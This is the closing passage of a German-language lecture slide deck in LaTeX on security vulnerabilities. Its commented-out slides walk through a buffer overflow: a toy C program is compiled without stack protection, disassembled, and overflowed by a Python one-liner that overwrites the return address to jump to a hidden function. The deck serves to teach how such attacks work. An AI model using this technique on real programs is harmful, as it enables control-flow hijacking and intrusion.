%     return 0;
%   }
%   \end{lstlisting}
% \end{frame}

% \begin{frame}[fragile]{Buffer Overflows -Programm II}
%   Compilieren f\"ur 32 bit:
%   \begin{lstlisting}[style=BashStyle]
%   gcc vuln.c -o vuln -fno-stack-protector -m32
%   \end{lstlisting}

%   Normale Eingabe:
%   \begin{lstlisting}[style=BashStyle]
%   Enter some text:
%   HackIt!
%   You entered: HackIt!
%   \end{lstlisting}

%   \includegraphics[scale=0.5]{stack}
% \end{frame}

% \begin{frame}[fragile]{Buffer Overflows -Programm III}
%   Anzeigen des Disassembly:
%   \begin{lstlisting}[style=BashStyle]
%   objdump -d vuln
%   \end{lstlisting}
%   \begin{figure}%
%    \centering
%    {\includegraphics[scale=0.1]{buf_c_1}}%
%    \quad
%    {\includegraphics[scale=0.1]{buf_c_2}}%
%   \end{figure}
% \end{frame}

% \begin{frame}[fragile]{Buffer Overflows -Programm IV}
%   \begin{itemize}
%     \item Adresse von \textit{secretFunction} ist \textbf{0000059d}
%     \item 38 in hex oder 56 in dezimal reserviert f\"ur lokale variablen der echo Funktion.
%     \item 28 bytes sind f\"ur Buffer reserviert.
%   \end{itemize}

%   \textbf{Payload:}
%   \newline
%   Die ersten 28+4=32 bytes sind zuf\"llige Chars und die n\"achsten 4 bytes die Addresse der \textit{secretFunction}.
%   \begin{lstlisting}[style=BashStyle]
%   python -c 'print "a"*32 + "\x00\x00\x05\x9d"' | ./vuln
%   \end{lstlisting}

%   Ausgabe:
%   \begin{lstlisting}[style=BashStyle]
%   Enter some text:
%   You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<rubbish 3 bytes>
%   Congratulations!
%   You have entered in the secret function!
%   Illegal instruction (core dumped)
%   \end{lstlisting}
% \end{frame}

%----------------------------------------------------------------------------------------
%	Sources
%----------------------------------------------------------------------------------------

\begin{frame}[fragile]{Quellen}
  \begin{itemize}
    \item \url{wikipedia.org}
    \item \url{owasp.org}
    \item \url{https://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize()}
    \item \url{https://www.statista.com/statistics/434880/cyber-crime-exploits/}
    \item \url{https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/}
    \item \url{https://www.security-insider.de/was-ist-cross-site-scripting-xss-a-699660/}
    \item \url{https://www.webmasterpro.de/server/article/sicherheit-sql-injection}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{}
  \huge Vielen Dank f\"ur ihre Aufmerksamkeit!
\end{frame}

\end{document}
